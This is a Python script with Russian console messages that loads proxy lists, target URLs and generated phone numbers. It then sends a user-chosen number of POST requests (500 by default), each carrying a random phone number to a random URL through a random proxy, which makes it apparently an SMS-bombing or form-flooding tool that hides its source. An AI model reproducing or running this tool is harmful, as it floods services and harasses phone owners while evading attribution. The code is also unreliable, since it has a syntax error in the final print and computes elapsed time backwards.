import random
from main import proxy, url, phone
import requests
import datetime
from colorama import Fore
from time import sleep
from time import time
now = datetime.datetime.now()
print(Fore.RED + "\n[*]   Программа запущена в " + str(now.hour) + ":" + str(now.minute) + "\n")

prox = proxy()
print(Fore.YELLOW + "[*]   Идет подгрузка прокси...")
proxy_list = prox.get_proxy()
print(Fore.GREEN + "[*]   Прокси подгружены" )
url = url()
print(Fore.YELLOW +"[*]   Идет подгрузка необходимых для работы ссылок..." )
url_list = url.get_url()
print(Fore.GREEN + "[*]   Необходимые ссылки подгружены" )
phone_class = phone()
print(Fore.YELLOW + "[*]   Идет генерация телефонных номеров...")
phone_list = phone_class.get_nomber()
print(Fore.GREEN + "[*]   Телефонные номера сгенерированны и подгружены")

default_kol_vo = 500
kol_vo = (input(Fore.WHITE + "\nСколько пакетов послать? (default : 500) "))
if kol_vo == "":
  kol_vo = default_kol_vo
else:
  kol_vo = int(kol_vo)
now = time()
def main(proxy_list, url_list, phone_list, kol_vo):
  u = 0
  for i in range(kol_vo):
    url_pos = random.randint(0,len(url_list)-1)
    proxy_pos = random.randint(0,len(proxy_list)-1)
    phone_pos = random.randint(0,len(phone_list)-1)
    url = url_list[url_pos]
    proxy =proxy_list[proxy_pos]
    phone = phone_list[phone_pos]
    proxy = {"http" : proxy}
    data = {"phone" : phone}
    try:
      packet = requests.post(url, data, proxies = proxy)
      u +=1
      print(Fore.GREEN + "[*]   Пакет отправлен. Статус код пакета: " + str(packet.status_code)+". Всего успешных пакетов отправлено: " + str(u) + ".  Прокси с которого был отправлен запрос: " + proxy["http"])
    except:
      print(Fore.GREEN + "[*]   Пакет отправлен. Всего успешных пакетов отправлено: " + str(u) + ".  Прокси с которого был отправлен запрос: " + proxy["http"])
      sleep(1)

if __name__ == '__main__' :
  main(proxy_list, url_list, phone_list, kol_vo)
  print("[+]   Времени прошло: " + str(int(now) - int(time()))


